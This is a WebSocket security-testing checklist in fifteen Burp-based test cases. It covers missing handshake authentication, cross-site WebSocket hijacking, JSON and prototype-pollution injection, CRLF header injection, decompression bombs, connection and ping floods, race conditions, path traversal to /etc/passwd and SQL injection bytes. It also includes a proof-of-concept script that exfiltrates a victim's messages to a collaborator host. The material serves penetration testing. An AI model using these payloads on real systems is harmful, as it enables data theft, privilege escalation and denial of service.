1. Test WebSocket handshake for missing authentication
Steps:

In Burp, go to Proxy → WebSockets History — find the initial WS upgrade request: GET /ws HTTP/1.1 with Upgrade: websocket header
Send this handshake request to Repeater
Remove the Cookie: header entirely — send the handshake — check if server responds 101 Switching Protocols
If connected, send a typical app WS message (copy from WebSockets history): {"action":"getMessages"} — check if data is returned
Also try: use a different user's session cookie (or no cookie) and access another user's WS endpoint
Check if WS URL itself requires auth token: wss://target.com/ws?token=... — remove the token param

Vulnerable When:

101 Switching Protocols received with no auth cookie/token in the handshake
Server responds to WS messages with real data from an unauthenticated connection
WS endpoint returns sensitive data without verifying who is connected

Severity: High

2. Test WebSocket for cross-site WebSocket hijacking (CSWSH)
Steps:

Capture the WS upgrade request in Burp
In Repeater, change Origin: https://target.com to Origin: https://evil.com
Send — if 101 is still returned, Origin is not validated
Now create a PoC HTML page (host on your server or use Burp Collaborator):

html<script>
  var ws = new WebSocket("wss://target.com/ws");
  ws.onmessage = function(e) {
    fetch("https://your-collaborator.net?data=" + btoa(e.data));
  };
</script>

Send the PoC URL to the victim — their browser opens WS to target with their cookies, exfiltrates messages to your server
Check Collaborator for base64-encoded WS messages from victim

Vulnerable When:

Handshake accepted with Origin: https://evil.com (no Origin validation)
No CSRF token required in the WS handshake URL or first message
Victim's WS messages arrive at your Collaborator — data exfiltrated cross-site

Severity: High

3. Test WebSocket for message format manipulation (JSON injection)
Steps:

Intercept a WS message in Burp WebSockets History — right-click → Send to Repeater
If message is JSON like {"action":"getUser","id":"5"}, try adding keys: {"action":"getUser","id":"5","role":"admin"}
Try string injection in values: {"action":"getUser","id":"5\",\"admin\":true"}
Try prototype pollution: {"__proto__":{"isAdmin":true}} or {"constructor":{"prototype":{"isAdmin":true}}}
Try changing the action value: {"action":"deleteUser","id":"1"} — does it execute?
Try numeric to string type confusion: {"id": "5"} vs {"id": 5} — different behavior?

Vulnerable When:

Added keys ("role":"admin") change the response or grant elevated access
"action":"deleteUser" executes successfully (IDOR via WS)
Prototype pollution causes isAdmin: true for subsequent checks
Type confusion ("id": 5 vs "id": "5") causes auth bypass or different data returned

Severity: High

4. Test WebSocket for message boundary attacks
Steps:

Connect to WS and send an empty message: "" — check server response
Send a null byte: \x00 as the entire message — observe behavior
Send a very large message: paste 10MB of A characters — does server crash or disconnect?
Send partial JSON: {"action": (cut off mid-object) — does server error out in a revealing way?
Send lone Unicode surrogates or invalid UTF-8 sequences in text frames
In Burp Repeater (WS), send messages with Content-Length mismatches if the protocol wraps in HTTP

Vulnerable When:

Server returns 500 or crashes on empty/null/large message (DoS)
Partial JSON causes logic error — server enters a bad state and subsequent messages are handled incorrectly
Invalid UTF-8 causes unhandled exception with stack trace in response

Severity: Medium (DoS); High if logic error causes auth bypass

5. Test WebSocket for compression-based attacks (PERMESSAGE-DEFLATE)
Steps:

Check WS upgrade handshake — look for Sec-WebSocket-Extensions: permessage-deflate in server response (compression enabled)
Send a highly compressible text payload: AAAA...AAAA (10,000 As) — compressed size should be very small
Compression oracle test: include a known secret in the payload alongside your test data, measure compressed size variation
Decompression bomb: construct a small compressed payload that expands to 100MB+ on decompression and send it
Check if server OOMs or disconnects (DoS via decompression bomb)

Vulnerable When:

Server crashes or OOMs on decompression bomb (DoS confirmed)
Compressed size differs measurably when secret is included vs not — CRIME-like side channel leaks session token prefix
Server accepts unlimited compressed payload sizes without enforcing a decompressed size limit

Severity: Medium–High

6. Test WebSocket for extension negotiation attacks
Steps:

In the WS upgrade request, modify the Sec-WebSocket-Extensions: header
Add an unknown extension: Sec-WebSocket-Extensions: x-unknown-extension
Add malformed extension params: Sec-WebSocket-Extensions: permessage-deflate; max-window-bits=999999
Try header injection in the extension value: Sec-WebSocket-Extensions: permessage-deflate\r\nX-Injected: evil
Check server's Sec-WebSocket-Extensions response — does it reflect injected content?
Also try: send both permessage-deflate and a conflicting extension simultaneously

Vulnerable When:

X-Injected: evil appears as a separate header in the 101 response (CRLF injection in handshake)
Unknown extension accepted with unusual server behavior
Malformed extension params (max-window-bits=999999) cause server crash (DoS)

Severity: Low–Medium (Medium–High if CRLF injection achieves response splitting)

7. Test WebSocket for connection limit bypass
Steps:

Write a quick script (Python's websockets lib) to open 500 simultaneous WS connections from your IP
Observe when server starts rejecting — note the limit
Try bypassing per-IP limit: use different auth tokens for each connection (same IP, different accounts)
Try different Origin headers per connection
Check if each open idle connection consumes server memory (run top on server if you have access, or measure response time degradation)
Try from multiple IPs using a proxy chain to confirm no per-user limit either

Vulnerable When:

No connection limit per IP — you can open 10,000 connections and server runs out of file descriptors / memory (DoS)
Per-IP limit bypassed by using different auth tokens — same IP with 1000 accounts = 1000 connections
Service degradation measurable for legitimate users while your flood is active

Severity: Medium (DoS)

8. Test WebSocket for ping/pong abuse for keepalive bypass
Steps:

Connect to WS, send a PING control frame (in Burp: use raw frame options) — server should respond with PONG
Send 1000 PING frames per second — check if server handles rate or crashes
Send an oversized PING payload — RFC 6455 limits control frames (including PING) to 125 bytes; send 126+ bytes
Check if server crashes or sends an error frame on oversized PING
Also test: send PONG frames without a preceding PING — some servers treat unsolicited PONG as an attack signal

Vulnerable When:

Server crashes on 126+ byte PING payload (buffer overflow in control frame handling)
PING flood (1000/sec) causes server CPU spike or drops legitimate connections (DoS)
Unsolicited PONG causes server to terminate all connections or enter an error state

Severity: Low–Medium

9. Test WebSocket for fragmentation-based attacks
Steps:

WebSocket allows splitting a message across multiple frames (FIN=0 for continuation, FIN=1 for final)
In Burp, use the raw frame editor — send: Frame 1 (FIN=0, opcode=1): {"action":" | Frame 2 (FIN=1, opcode=0): "getAdmin"}
Between data frames, inject a control frame (PING or CLOSE) — RFC says this is allowed but some parsers break
Send 50,000 single-byte fragments that add up to a large message — test if server reassembles without limit
WAF bypass test: if WAF blocks {"action":"getAdmin"} as a single frame, does it pass if fragmented across 5 frames?

Vulnerable When:

WAF bypass: fragmented message bypasses detection and server executes the action (getAdmin succeeds)
Server crashes on excessive fragmentation (DoS via memory exhaustion during reassembly)
Interleaved control frames cause the server to corrupt the reassembly buffer

Severity: Medium (High if WAF bypass enables SQLi/auth bypass via fragmented frames)

10. Test WebSocket for binary message handling vulnerabilities
Steps:

App normally sends text frames (opcode 0x1) with JSON — intercept and change frame type to binary (opcode 0x2) with same content
In Burp WS Repeater, switch to binary mode and send the same JSON payload as raw bytes
Try sending binary frames with null bytes embedded: \x00{"action":"getUser"} or {"action":"getUser\x00admin"}
If app handles file transfers over WS: send binary with path traversal in filename metadata: ../../etc/passwd
Try sending binary that decodes to XSS payload: base64 encode <script>alert(1)</script> and send as binary frame

Vulnerable When:

Server processes binary frames with same logic as text — null bytes bypass input filters (null byte injection)
Path traversal in binary file reference causes server to serve /etc/passwd
Type confusion: app expects text, gets binary, parser error reveals stack trace

Severity: Medium

11. Test WebSocket for max message size bypass
Steps:

Find what the app's max WS message size is — often in source code comments, docs, or by trial and error
Send a message at exactly the limit — should work fine
Send limit + 1 byte — should be rejected; if not, limit not enforced
Fragmentation bypass: send a large message fragmented into many small frames that each are under the per-frame limit — total size exceeds max
Send a message that after server-side processing (e.g., base64 decode) expands beyond the limit
Monitor server response time / error code for each size

Vulnerable When:

Message larger than stated limit is accepted (no size enforcement)
Fragmented large message bypasses per-frame limit check — total decompressed size causes OOM (DoS)
Server crashes on oversized message: memory exhaustion DoS

Severity: Medium

12. Test WebSocket for subscription/channel access control
Steps:

Log in as User A, connect to WS, subscribe to your own channel: {"action":"subscribe","channel":"user_100_inbox"}
Note other channel IDs from JS source, API responses, or by incrementing: user_101_inbox, user_1_inbox (admin?)
Log out, log in as User B — connect WS, try subscribing to User A's channel: {"action":"subscribe","channel":"user_100_inbox"}
Check if you receive User A's messages as User B
Try admin/system channels: {"action":"subscribe","channel":"admin_alerts"}, {"action":"subscribe","channel":"audit_log"}
Try without subscribing — just listen on * or # wildcards: {"action":"subscribe","channel":"*"}

Vulnerable When:

User B receives messages intended for User A (IDOR via WS channel ID)
Admin channel subscription succeeds for a regular user — admin events received
Wildcard subscription works and all channels' messages received

Severity: High

13. Test WebSocket for race condition in message handling
Steps:

Find a WS action that modifies state: {"action":"placeOrder","item":"X","qty":1} or {"action":"transferFunds","amount":100,"to":"attacker"}
Open 2 WS connections simultaneously as the same user (2 browser tabs or 2 Burp WS connections)
Send the same state-changing message from both connections at exactly the same time — use Burp Intruder with Resource pool: 1 thread for timing, or a Python asyncio script
Check if the action executes twice: order placed twice, funds transferred twice, reward granted twice
Also test auth race: connect WS, send first message before auth confirmation arrives from server

Vulnerable When:

Same order placed twice / funds transferred twice (double-spend / double-execution)
Balance goes negative but action still proceeds (no atomic check-then-act)
Auth race: first message processed before server verifies session, data returned for split-second window

Severity: High

14. Test WebSocket for token refresh in long-lived connections
Steps:

Establish a WS connection using a JWT with a short expiry (e.g., 15 minutes) — note the connection time
Wait for the JWT to expire (keep WS connection open) — don't send any messages during this time
After expiry, send a normal WS message and check if server still responds with valid data
Also test: while WS is open, log out from the web UI (invalidates session server-side)
After logout, send a WS message over the still-open connection — does server process it?
Try revoking the token via another endpoint while WS is open

Vulnerable When:

Expired JWT's WS connection still receives valid data responses (auth check only at handshake, not per-message)
Post-logout WS connection still processes requests — session revocation not propagated to WS
Attacker who steals a WS connection (CSWSH) maintains access even after victim logs out

Severity: Medium–High

15. Test WebSocket for data exfiltration via binary frames
Steps:

Connect to WS — send a text message with a file path: {"action":"readFile","path":"/etc/passwd"} — check if binary data comes back
If app returns binary frames: capture in Burp WS History, right-click → Save binary — inspect the bytes
Try sending binary-encoded path traversal: construct a binary frame where the payload bytes spell out ../../etc/passwd in the expected binary format
Try encoding payloads as base64 in the binary frame to bypass text-based WAF: eyJhY3Rpb24... (base64 of {"action":"getAdmin"})
Send binary frames with embedded SQL: 0x27 0x4F 0x52 0x20 0x31 0x3D 0x31 (bytes for ' OR 1=1)

Vulnerable When:

Server returns file contents in binary WS frames (LFI via WS)
base64-encoded payload in binary frame bypasses text WAF and SQL/command injection succeeds
Binary frame with embedded path traversal causes server to return internal file content

Severity: High